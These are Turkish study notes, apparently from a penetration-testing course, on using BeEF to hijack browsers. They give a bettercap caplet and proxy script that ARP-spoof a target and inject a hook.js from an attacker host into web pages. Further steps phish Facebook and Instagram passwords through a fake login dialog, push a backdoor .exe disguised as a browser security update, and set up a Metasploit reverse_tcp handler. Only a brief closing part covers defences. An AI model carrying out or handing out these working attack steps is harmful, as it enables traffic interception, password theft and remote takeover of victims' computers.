### Beef

BeEF, bir kullanıcının web tarayıcısını hedef alarak kontrol etmeyi amaçlayan bir penetration testing aracıdır.

Nasıl çalışır?

- Kurban bir zararlı JavaScript kodu içeren sayfayı açar
- Tarayıcı bu kodu çalıştırır
- Tarayıcı saldırganın BeEF paneline bağlanır (hook olur)
- Saldırgan tarayıcı üzerinden bazı işlemler yapabilir

- Beef açılır yeni şifre oluşturulur ve arayüz açılır
- Terminalde hook kodu verilir js.
- Solda kurbanın online olup olmadığı görünür

**_ Hedefi Oltaya Takmak _**

- Ağ içi saldırılar için
- Web sitesi oluşturulmalı ve js kodu koyulmalı
- Denemek içim kali web olarak açılabilir
  > services apache2 start
- Beef açıldığında terminalde verilen <script src="http://127.0.0.1:3000/hook.js"></script> kodunu kendi kali ip vyazılarak siteye eklenir

**_ JS Enjeksiyonu _**

- Ortadaki adam saldırı ile js enjeksiyonu ile kurbanın girdiği web site önemsiz hacklenebilir.

- bettercap kullanılır. Caplet oluşturulur. OLuşturulmuş caplet kullanılır.

* Caplet : Bettercap içinde caplet, belirli komutları otomatik çalıştıran script dosyasıdır. Yani Bettercap’i her seferinde tek tek komut yazmadan çalıştırmanı sağlar.

//

> > beefcustom.cap

> set arp.spoof.fullduplex true
> set arp.spoof.targets 10.0.2.4 //hedef ip girilir
> set http.proxy.script beefcustom.js
> http.proxy on
> sleep 1
> arp.spoof on
> ""

//

//

> > beefcustom.js

function onLoad() {
log( "BeefInject loaded." );
}

function onResponse(req, res) {
if( res.ContentType.indexOf('text/html') == 0 ){
var body = res.ReadBody();
if( body.indexOf('</head>') != -1 ) {
log( "BeefInject loaded." );
res.Body = body.replace(
'</head>',
'<script type="text/javascript" src="http://10.0.2.8:3000/hook.js"></script></head>'
);
}
}
}

//

- Bu dosyalar /usr/share/bettercap/caplets altına klasör halinde yapıştır bu iki dosyayı. Klasöre beefcustom ismi verilir (opsiyonel)

> bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap //tüm işlemleri yapar. http web sitelerinde deneyebilirisin.Kurban browser kullandığında Online browsers kısmında kurban görünür

- online olan tarayıcı açılıp "commands" kısmında kurbana neler yapılabileceği gösterilir.
- Spyder eye seçilir ve execute yapıldığıında kurbanın ekran anlık ekran görüntüsü alınır.

**_ Sosyal Medya Şifreleri Nasıl Çalınır _**

- Commands kısmında Pretty Thef kısmı açılır. Dialog Type:Facebook,Insta... ,
  Backing: Grey , Logo : Logo girilir inandırıcılık için

- Kurbanın tarayıcısında küçük arayüz açılır. Facebook,instagram tekrar giriş yapın tarzı. Kurban bilgilerini girerse şifre eposta alıınır

**_ Backdoor İletme Yöntemi _**

- Beef ile Tarayıcıdan backdoor göndererek kurabının bilgisayarı ele geçirilir

- Backdoor oluşturulur
- Kali Web haline getirilir. Kali web klasörüne backdoor yerleştirilir. Backdoor bir web servisten indirilecektir.

> service apache2 start

- Beef'ten "Fake Notification Bar (crome)" açılır. Url: kısmına kali web .exe urlsi girilir. Url: "http:/10.2.0/backdoor/plugin.exe" , Notification Text:"Tarayıcı güvenlik güncellemesi yapınız."

> msfconsole //açılır
> use exploit/multi/handler
> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp //oluşturulan backdoor bilgileri
> msf6 exploit(multi/handler) > show options
> msf6 exploit(multi/handler) > set LHOST 192.168.64.2
> msf6 exploit(multi/handler) > set LPORT 8080
> msf6 exploit(multi/handler) > exploit -j -z
> msf6 exploit(multi/handler) > session -l
> msf6 exploit(multi/handler) > session -1

**_ Kendimizi Nasıl Koruruz _**

- Trayıcıdan veya herhangi biri tarafından gelen/indirilen dosyaları sağ tik>isim değiştir yapılıp right to left chacter override var mı bakabiliriz

- Dosyaya sağ tik> özellikler den dosya tipi incelenir .exe olup olmadığı

- arp -a ile aynı mac adresine sahip iki cihaz var mı bakılır
